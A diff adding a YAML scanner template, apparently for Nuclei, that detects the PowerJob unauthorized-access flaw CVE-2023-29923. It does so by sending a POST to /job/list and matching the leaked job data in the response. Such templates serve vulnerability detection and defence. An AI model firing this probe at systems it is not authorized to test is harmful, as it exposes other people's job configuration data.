@@ -1,0 +1,31 @@
+id: poc-yaml-powerjob-list-unauthorized-access
+info:
+  name: PowerJob Unauthorized Access Vulnerability (CVE-2023-29923)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: CVE-2023-29923
+  description: |
+    This template detects unauthorized access to PowerJob's job list endpoint, which can lead to information disclosure.
+http:
+  - raw:
+      - |
+        POST /job/list HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"appId":1,"index":0,"pageSize":10}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - 'jobName'
+          - '"timeExpressionType":"API"'
+      - type: regex
+        part: body
+        regex:
+          - '\{"success":true,"data":\{"index":0,"pageSize":10'
